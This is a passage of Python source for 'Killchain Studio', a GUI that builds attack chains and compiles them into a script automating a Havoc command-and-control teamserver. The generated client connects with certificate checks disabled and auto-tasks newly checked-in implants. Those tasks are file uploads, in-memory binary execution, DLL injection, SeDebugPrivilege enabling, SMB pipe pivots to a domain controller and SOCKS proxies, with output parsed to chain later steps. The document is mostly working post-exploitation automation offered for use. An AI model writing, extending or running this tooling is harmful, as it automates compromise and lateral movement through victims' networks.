            {"id": "l_12", "type": "custom", "desc": "🔑 Token Privilege Enable (SeDebugPrivilege)", "cmd_index": 26,
             "user_vals": {"_priv_name": "SeDebugPrivilege"},
             "info": {"CommandID": "40", "SubCommand": "privs-get", "Arguments": "SeDebugPrivilege"},
             "x": 50, "y": 360, "width": 270, "height": 75, "font_size": 10}
        ]
        self.chains["system"] = [
            {"id": "s_10", "type": "custom", "desc": "🔌 Pivot SMB Named Pipe → \\\\{dc_host}\\pipe\\mojo", "cmd_index": 53,
             "user_vals": {"_pipe": "\\\\{dc_host}\\pipe\\mojo"},
             "info": {"CommandID": "2520", "Command": "10", "Param": "\\\\{dc_host}\\pipe\\mojo"},
             "x": 430, "y": 60, "width": 270, "height": 75, "font_size": 10},
            {"id": "s_11", "type": "custom", "desc": "🌍 SOCKS5 Proxy Add (Port 1080)", "cmd_index": 60,
             "user_vals": {"_port": "1080"},
             "info": {"CommandID": "2540", "Command": "socks add", "Params": "1080"},
             "x": 430, "y": 210, "width": 270, "height": 75, "font_size": 10}
        ]
        self.rebuild_deps()
        self.draw_graph()
        if self.chains["system"]:
            self.json_preview.delete(1.0, tk.END)
            self.json_preview.insert(tk.END, json.dumps(self.chains["system"][0].get("info", {}), indent=2))

    def open_file(self):
        filepath = filedialog.askopenfilename(filetypes=[("Python Files", "*.py"), ("All Files", "*.*")], title=f"Open Phantom File ({self.title})")
        if not filepath: return
        
        self.chains = {"low_priv": [], "system": [], "dependencies": []}
        current_chain = "low_priv"
        p_dir = self.config["payload_dir"]
        
        try:
            with open(filepath, "r") as f:
                content = f.read()
                
            lines = content.split('\n')
            for i, line in enumerate(lines):
                if "HAVOC_HOST =" in line:
                    self.config["host"] = line.split("=")[1].strip().strip('"').strip("'")
                if "HAVOC_PORT =" in line:
                    self.config["port"] = line.split("=")[1].strip().strip('"').strip("'")
                if "HAVOC_USER =" in line:
                    self.config["user"] = line.split("=")[1].strip().strip('"').strip("'")
                if "HAVOC_PASS =" in line:
                    self.config["pass"] = line.split("=")[1].strip().strip('"').strip("'")
            
            for i, line in enumerate(lines):
                if "SYSTEM Phase" in line or "KETTE B: High-Privilege" in line or "SYSTEM Demon auf" in line:
                    current_chain = "system"
                
                if "payload_info =" in line and "{" in line:
                    try:
                        json_str = line.split("payload_info = f'")[1].split("'")[0]
                        json_str = json_str.replace("{{", "{").replace("}}", "}")
                        info = json.loads(json_str)
                        
                        desc = "Loaded Step"
                        if i + 1 < len(lines) and "display_cmd='" in lines[i+1]:
                            desc = lines[i+1].split("display_cmd='")[1].split("'")[0]
                            
                        step = {"id": self.generate_id("l" if current_chain == "low_priv" else "s"), "type": "custom", "desc": desc, "info": info}
                        self.chains[current_chain].append(step)
                        continue
                    except:
                        pass
                
                if "await send_command(" in line:
                    try:
                        cmd_str = line.split("send_command(")[1].split(",")[2].strip()
                        if cmd_str.startswith("f\"") or cmd_str.startswith("f'"):
                            cmd_str = cmd_str[2:-2]
                        elif cmd_str.startswith("\"") or cmd_str.startswith("'"):
                            cmd_str = cmd_str[1:-2]
                            
                        cmd_str = cmd_str.replace("{PAYLOAD_DIR}", p_dir)
                        info = {}
                        desc = "Parsed Step"
                        
                        if cmd_str.startswith("upload "):
                            parts = cmd_str.split(" ")
                            info = {"CommandID": "15", "SubCommand": "upload", "Arguments": f"<B64FILE:{parts[1]}:{parts[2]}>"}
                            desc = f"upload {parts[1]} {parts[2]}"
                        elif cmd_str.startswith("inline-execute "):
                            parts = cmd_str.split(" ")
                            info = {"CommandID": "20", "FunctionName": "go", "Binary": f"<B64BIN:{parts[1]}>", "Arguments": "", "HasCallback": "false", "Flags": "default"}
                            desc = f"inline-execute {parts[1]}"
                        elif cmd_str.startswith("dll inject "):
                            parts = cmd_str.split(" ")
                            pid_val = "{ctf_pid}" if "{" in parts[2] else parts[2]
                            info = {"CommandID": "22", "PID": pid_val, "Binary": f"<B64BIN:{parts[3]}>", "Arguments": ""}
                            desc = f"dll inject {pid_val} {parts[3]}"
                            
                        if info:
                            self.chains[current_chain].append({"id": self.generate_id("l" if current_chain == "low_priv" else "s"), "type": "custom", "desc": desc, "info": info})
                    except:
                        pass
                        
                if 're.search(r"' in line or "re.search(r'" in line:
                    try:
                        if 're.search(r"' in line:
                            regex = line.split('re.search(r"')[1].split('",')[0]
                        else:
                            regex = line.split("re.search(r'")[1].split("',")[0]
                            
                        if i + 2 < len(lines):
                            var_line = lines[i+2].strip()
                            if " = match.group(1)" in var_line:
                                var_name = var_line.split(" = ")[0].strip()
                                
                                if self.chains[current_chain]:
                                    last_step = self.chains[current_chain][-1]
                                    if "regexes" not in last_step:
                                        last_step["regexes"] = []
                                    if not any(r["var_name"] == var_name for r in last_step["regexes"]):
                                        last_step["regexes"].append({"regex": regex, "var_name": var_name})
                    except:
                        pass
                        
            for c in ["low_priv", "system"]:
                y_offset = 100
                x_offset = 100 if c == "low_priv" else 500
                for step in self.chains[c]:
                    step["x"] = x_offset
                    step["y"] = y_offset
                    step["width"] = 250
                    step["height"] = 70
                    step["font_size"] = 10
                    y_offset += 150
                    
            self.rebuild_deps()
            self.draw_graph()
        except Exception as e:
            messagebox.showerror("Error", f"Could not parse file:\n{e}")

    def compile_code(self):
        filepath = filedialog.asksaveasfilename(defaultextension=".py", filetypes=[("Python Files", "*.py")], initialfile="phantom_compiled.py", title=f"Save {self.title} As...")
        if not filepath: return
        
        output = f"""import asyncio
import websockets
import json
import ssl
import re
import os
import base64
from datetime import datetime

HAVOC_HOST = "{self.config['host']}"
HAVOC_PORT = "{self.config['port']}"
HAVOC_USER = "{self.config['user']}"
HAVOC_PASS = "{self.config['pass']}"

state_tracker = {{}}
dead_demons = set()

def log(msg):
    print(f"{{datetime.now().strftime('%d/%m/%Y %H:%M:%S')}} {{msg}}")

async def send_chat(websocket, msg):
    b64_msg = base64.b64encode(f"<b style='color:#ffb86c;'>[PhantomOP]</b> {{msg}}".encode('utf-8')).decode('utf-8')
    payload = {{
        "Head": {{
            "Event": 4,
            "Time": datetime.now().strftime("%H:%M:%S"),
            "User": HAVOC_USER
        }},
        "Body": {{
            "SubEvent": 1,
            "Info": {{
                "PhantomOP": b64_msg
            }}
        }}
    }}
    await websocket.send(json.dumps(payload))

async def send_command_safe(websocket, demon_id, payload_info, display_cmd=""):
    try:
        import string, random
        task_id = ''.join(random.choices(string.hexdigits.upper(), k=8))

        import re
        for key, val in list(payload_info.items()):
            if not isinstance(val, str): continue

            while "<B64FILE:" in val:
                match = re.search(r"<B64FILE:(.+?):(.+?)>", val)
                if not match: break
                local_path, remote_path = match.group(1), match.group(2)
                with open(local_path, "rb") as f:
                    file_bytes = f.read()
                remote_b64 = base64.b64encode(remote_path.encode('utf-8')).decode('utf-8')
                content_b64 = base64.b64encode(file_bytes).decode('utf-8')
                val = val.replace(match.group(0), f"{{remote_b64}};{{content_b64}}", 1)

            while "<B64BIN:" in val:
                match = re.search(r"<B64BIN:(.+?)>", val)
                if not match: break
                with open(match.group(1), "rb") as f:
                    content_b64 = base64.b64encode(f.read()).decode('utf-8')
                val = val.replace(match.group(0), f"{{content_b64}}", 1)

            while "<B64STR:" in val:
                match = re.search(r"<B64STR:(.+?)>", val)
                if not match: break
                encoded = base64.b64encode(match.group(1).encode('utf-8')).decode('utf-8')
                val = val.replace(match.group(0), f"{{encoded}}", 1)

            payload_info[key] = val

        payload_info["DemonID"] = demon_id
        payload_info["TaskID"] = task_id
        payload_info["AgentType"] = "Demon"
        if display_cmd: payload_info["CommandLine"] = display_cmd

        packet = {{
            "Head": {{ "Event": 7, "User": HAVOC_USER }},
            "Body": {{
                "SubEvent": 3,
                "Info": payload_info
            }}
        }}
        await websocket.send(json.dumps(packet))
        log(f"[PhantomOP] Demon >> {{display_cmd}}")
    except Exception as e:
        log(f"[-] Command failure: {{e}}")

async def handle_new_demon(websocket, demon_id, hostname, process, is_system):
    global automation_active, automation_paused
    if not automation_active or automation_paused or demon_id in dead_demons: return

    if hostname not in state_tracker:
        state_tracker[hostname] = {{"low_priv_done": False, "system_done": False, "low_priv_id": None, "system_id": None, "vars": {{}}}}

    state = state_tracker[hostname]

    if not is_system and not state["low_priv_done"]:
        log(f"[KETTE] Starte Low-Priv Phase auf {{hostname}}...")
        state["low_priv_id"] = demon_id
"""
        has_deps = False
        cascade_deps = False
        for step in self.chains["low_priv"]:
            info_str_raw = json.dumps(step["info"])
            
            depends_on_same_chain = False
            for d in self.chains["dependencies"]:
                if f"{{{d['var_name']}}}" in info_str_raw and any(s["id"] == d["source_id"] for s in self.chains["low_priv"]):
                    depends_on_same_chain = True
                    
            if depends_on_same_chain:
                has_deps = True
                cascade_deps = True
                
            if cascade_deps:
                continue
                
            info_str = json.dumps(step["info"]).replace("\\", "\\\\")
            info_str = info_str.replace("{", "{{").replace("}", "}}")
            for dep in self.chains["dependencies"]:
                info_str = info_str.replace(f"{{{{{dep['var_name']}}}}}", f"{{vars_dict[\"{dep['var_name']}\"]}}" if any(s["id"] == dep["source_id"] for s in self.chains["low_priv"]) else f"{{state_tracker[hostname]['vars'][\"{dep['var_name']}\"]}}")
                
            output += f"        payload_info = f'{info_str}'\n"
            desc = step['desc'].replace("\\", "\\\\").replace("'", "\\'")
            desc = desc.replace("{", "{{").replace("}", "}}")
            for dep in self.chains["dependencies"]:
                desc = desc.replace(f"{{{{{dep['var_name']}}}}}", f"{{vars_dict[\"{dep['var_name']}\"]}}" if any(s["id"] == dep["source_id"] for s in self.chains["low_priv"]) else f"{{state_tracker[hostname]['vars'][\"{dep['var_name']}\"]}}")
            output += f"        await send_command_safe(websocket, demon_id, json.loads(payload_info), display_cmd=f'{desc}')\n"

        if not has_deps:
            output += "        state[\"low_priv_done\"] = True\n"
            
        output += """
    elif is_system and not state["system_done"]:
        log(f"[KETTE] SYSTEM Phase gestartet auf {{hostname}}...")
        state["system_id"] = demon_id
"""
        has_deps_sys = False
        cascade_deps_sys = False
        for step in self.chains["system"]:
            info_str_raw = json.dumps(step["info"])
            
            depends_on_same_chain = False
            for d in self.chains["dependencies"]:
                if f"{{{d['var_name']}}}" in info_str_raw and any(s["id"] == d["source_id"] for s in self.chains["system"]):
                    depends_on_same_chain = True
                    
            if depends_on_same_chain:
                has_deps_sys = True
                cascade_deps_sys = True
                
            if cascade_deps_sys:
                continue
                
            info_str = json.dumps(step["info"]).replace("\\", "\\\\")
            info_str = info_str.replace("{", "{{").replace("}", "}}")
            for dep in self.chains["dependencies"]:
                info_str = info_str.replace(f"{{{{{dep['var_name']}}}}}", f"{{vars_dict[\"{dep['var_name']}\"]}}" if any(s["id"] == dep["source_id"] for s in self.chains["system"]) else f"{{state_tracker[hostname]['vars'][\"{dep['var_name']}\"]}}")
                
            output += f"        payload_info = f'{info_str}'\n"
            desc = step['desc'].replace("\\", "\\\\").replace("'", "\\'")
            desc = desc.replace("{", "{{").replace("}", "}}")
            for dep in self.chains["dependencies"]:
                desc = desc.replace(f"{{{{{dep['var_name']}}}}}", f"{{vars_dict[\"{dep['var_name']}\"]}}" if any(s["id"] == dep["source_id"] for s in self.chains["system"]) else f"{{state_tracker[hostname]['vars'][\"{dep['var_name']}\"]}}")
            output += f"        await send_command_safe(websocket, demon_id, json.loads(payload_info), display_cmd=f'{desc}')\n"

        if not has_deps_sys:
            output += "        state[\"system_done\"] = True\n"
            
        output += """
async def handle_task_output(websocket, task):
    demon_id = task.get("DemonID")
    if demon_id in dead_demons: return
    
    output_raw = task.get("Output", "")
    if not output_raw: return
    
    try:
        output_bytes = base64.b64decode(output_raw)
        cmd_output = output_bytes.decode('utf-8', errors='ignore')
    except:
        cmd_output = output_raw

    try:
        inner_json = json.loads(cmd_output)
        if "Output" in inner_json:
            cmd_output = inner_json["Output"]
    except:
        pass

    hostname = next((h for h, s in state_tracker.items() if s.get("system_id") == demon_id or s.get("low_priv_id") == demon_id), None)
    if not hostname: return
    state = state_tracker[hostname]
    if state.get("low_priv_id") == demon_id and not state["low_priv_done"]:
"""
        for dep in self.chains["dependencies"]:
            if any(step["id"] == dep["source_id"] for step in self.chains["low_priv"]):
                output += f"""
        match = re.search(r"{dep['regex']}", cmd_output)
        if match:
            state_tracker[hostname]["vars"]["{dep['var_name']}"] = match.group(1)
            log(f"[+] Found dependency {dep['var_name']}: {{match.group(1)}}")
"""
        output += "        vars_dict = state_tracker[hostname]['vars']\n"
        
        dep_vars = [d["var_name"] for d in self.chains["dependencies"] if any(step["id"] == d["source_id"] for step in self.chains["low_priv"])]
        if dep_vars:
            cond = " and ".join([f"'{v}' in vars_dict" for v in dep_vars])
            output += f"        if {cond}:\n"
            output += "            state[\"low_priv_done\"] = True\n"
            cascade_deps = False
            for step in self.chains["low_priv"]:
                info_str_raw = json.dumps(step["info"])
                
                depends_on_same_chain = False
                for d in self.chains["dependencies"]:
                    if f"{{{d['var_name']}}}" in info_str_raw and any(s["id"] == d["source_id"] for s in self.chains["low_priv"]):
                        depends_on_same_chain = True
                        cascade_deps = True
                        
                if cascade_deps:
                    info_str = json.dumps(step["info"]).replace("\\", "\\\\")
                    info_str = info_str.replace("{", "{{").replace("}", "}}")
                    for dep in self.chains["dependencies"]:
                        info_str = info_str.replace(f"{{{{{dep['var_name']}}}}}", f"{{vars_dict[\"{dep['var_name']}\"]}}")
                    
                    output += f"            payload_info = f'{info_str}'\n"
                    desc = step['desc'].replace("\\", "\\\\").replace("'", "\\'")
                    desc = desc.replace("{", "{{").replace("}", "}}")
                    for dep in self.chains["dependencies"]:
                        desc = desc.replace(f"{{{{{dep['var_name']}}}}}", f"{{vars_dict[\"{dep['var_name']}\"]}}")
                    output += f"            await send_command_safe(websocket, demon_id, json.loads(payload_info), display_cmd=f'{desc}')\n"
            
        output += """
    if state.get("system_id") == demon_id and not state["system_done"]:
"""
        for dep in self.chains["dependencies"]:
            if any(step["id"] == dep["source_id"] for step in self.chains["system"]):
                output += f"""
        match = re.search(r"{dep['regex']}", cmd_output)
        if match:
            state_tracker[hostname]["vars"]["{dep['var_name']}"] = match.group(1)
            log(f"[+] Found dependency {dep['var_name']}: {{match.group(1)}}")
"""
        output += "        vars_dict = state_tracker[hostname]['vars']\n"
        
        dep_vars = [d["var_name"] for d in self.chains["dependencies"] if any(step["id"] == d["source_id"] for step in self.chains["system"])]
        if dep_vars:
            cond = " and ".join([f"'{v}' in vars_dict" for v in dep_vars])
            output += f"        if {cond}:\n"
            output += "            state[\"system_done\"] = True\n"
            cascade_deps_sys = False
            for step in self.chains["system"]:
                info_str_raw = json.dumps(step["info"])
                
                depends_on_same_chain = False
                for d in self.chains["dependencies"]:
                    if f"{{{d['var_name']}}}" in info_str_raw and any(s["id"] == d["source_id"] for s in self.chains["system"]):
                        depends_on_same_chain = True
                        cascade_deps_sys = True
                        
                if cascade_deps_sys:
                    info_str = json.dumps(step["info"]).replace("\\", "\\\\")
                    info_str = info_str.replace("{", "{{").replace("}", "}}")
                    for dep in self.chains["dependencies"]:
                        info_str = info_str.replace(f"{{{{{dep['var_name']}}}}}", f"{{vars_dict[\"{dep['var_name']}\"]}}")
                    
                    output += f"            payload_info = f'{info_str}'\n"
                    desc = step['desc'].replace("\\", "\\\\").replace("'", "\\'")
                    desc = desc.replace("{", "{{").replace("}", "}}")
                    for dep in self.chains["dependencies"]:
                        desc = desc.replace(f"{{{{{dep['var_name']}}}}}", f"{{vars_dict[\"{dep['var_name']}\"]}}")
                    output += f"            await send_command_safe(websocket, demon_id, json.loads(payload_info), display_cmd=f'{desc}')\n"
            
        output += """
# Havoc Client Loop
async def havoc_client():
    global automation_active, automation_paused
    uri = f"wss://{HAVOC_HOST}:{HAVOC_PORT}/havoc/"

    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    while True:
        try:
            log(f"Connecting to Teamserver at {uri}...")
            async with websockets.connect(uri, ssl=ssl_context) as websocket:
                import hashlib
                password_hash = hashlib.sha3_256(HAVOC_PASS.encode()).hexdigest()

                auth_payload = {
                    "Head": { "Event": 1, "User": HAVOC_USER, "Time": datetime.now().strftime("%d/%m/%Y %H:%M:%S") },
                    "Body": { "SubEvent": 3, "Info": { "User": HAVOC_USER, "Password": password_hash } }
                }
                await websocket.send(json.dumps(auth_payload))

                async for message in websocket:
                    data = json.loads(message)
                    head = data.get("Head", {})
                    body = data.get("Body", {})
                    event_id = head.get("Event", 0)

                    if event_id == 1:
                        if body.get("SubEvent") == 1:
                            log("Authentifizierung erfolgreich! Headless Operator läuft...")
                        elif body.get("SubEvent") == 2:
                            log("Authentifizierung fehlgeschlagen! Passwort prüfen.")

                    elif event_id == 7:
                        sub_event = body.get("SubEvent", 0)
                        if sub_event == 1:
                            info = body.get("Info", {})
                            demon_id = info.get("NameID")
                            hostname = info.get("Hostname", "Unknown")
                            process = info.get("ProcessName", "Unknown")
                            is_system = "SYSTEM" in info.get("Username", "").upper()
                            asyncio.create_task(handle_new_demon(websocket, demon_id, hostname, process, is_system))
                        elif sub_event == 4:
                            asyncio.create_task(handle_task_output(websocket, body.get("Info", {})))
                        elif sub_event == 5:
                            info = body.get("Info", {})
                            agent_id = info.get("AgentID")
                            marked = info.get("Marked")
                            if agent_id and marked == "Dead":
                                dead_demons.add(agent_id)
                                
                    elif event_id == 4:
                        info = body.get("Info", {})
                        sender = head.get("User", "")
                        if sender != HAVOC_USER:
                            for key, val in info.items():
                                try:
                                    decoded = base64.b64decode(val).decode('utf-8', errors='ignore')
                                except:
                                    decoded = str(val)
                                
                                msg_lower = decoded.lower().strip()
                                
                                if "!stop" in msg_lower:
                                    automation_active = False
                                    automation_paused = False
                                    log("[CONTROL] Automation STOPPED via chat command.")
                                elif "!start" in msg_lower:
                                    automation_active = True
                                    automation_paused = False
                                    log("[CONTROL] Automation STARTED via chat command.")
                                elif "!pause" in msg_lower:
                                    automation_paused = True
                                    log("[CONTROL] Automation PAUSED via chat command.")
                                elif msg_lower.startswith("!skip "):
                                    target_host = msg_lower.split(" ", 1)[1].strip()
                                    real_host = next((h for h in state_tracker.keys() if h.lower() == target_host), None)
                                    if real_host:
                                        state_tracker[real_host]["low_priv_done"] = True
                                        state_tracker[real_host]["system_done"] = True
                                        log(f"[CONTROL] Skipped host {real_host}")
        except Exception as e:
            log(f"Connection error: {e}")
            await asyncio.sleep(5)

automation_active = True
automation_paused = False

if __name__ == "__main__":
    asyncio.run(havoc_client())
"""
        try:
            with open(filepath, "w") as f:
                f.write(output)
            messagebox.showinfo("Success", f"Compiled successfully to:\n{filepath}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to compile:\n{e}")

class KillchainStudioApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Killchain Studio - Multi-Project View")
        self.root.geometry("1600x900")
        self.clipboard = None
        
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("TFrame", background="#1e1e1e")
        style.configure("TButton", background="#333333", foreground="#ffffff", font=("Consolas", 10, "bold"))
        
        self.paned = ttk.PanedWindow(self.root, orient=tk.HORIZONTAL)
        self.paned.pack(fill=tk.BOTH, expand=True)
        
        self.left_pane = ttk.Frame(self.paned)
        self.right_pane = ttk.Frame(self.paned)
        
        self.paned.add(self.left_pane, weight=1)
        self.paned.add(self.right_pane, weight=1)
        
        self.ws_left = ProjectWorkspace(self.left_pane, self, "Project 1 (Host Privilege Escalation Chain)")
        self.ws_left.load_defaults()
        
        self.ws_right = ProjectWorkspace(self.right_pane, self, "Project 2 (AD Lateral Movement & Pivot Chain)")
        self.ws_right.load_lateral_example()

if __name__ == "__main__":
    root = tk.Tk()
    app = KillchainStudioApp(root)
    root.mainloop()
